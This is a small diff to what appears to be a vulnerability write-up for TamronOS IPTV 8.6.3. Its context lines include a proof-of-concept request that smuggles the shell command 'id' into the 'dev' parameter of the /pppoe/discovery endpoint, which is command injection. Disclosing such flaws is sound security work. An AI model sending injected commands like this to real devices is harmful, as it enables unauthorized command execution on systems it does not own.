@@ -24,6 +24,7 @@ Access the `/pppoe/discovery` path to call the `pppoeiscovery` method
 
 
 Test version : `TamronOS IPTV 8.6.3`
+
 ![version](https://github.com/yuxianzi/Tamronos-iptv-CVE/blob/main/png/version.png)
 
 request `http://172.16.49.166/pppoe/discovery?dev=;id;`
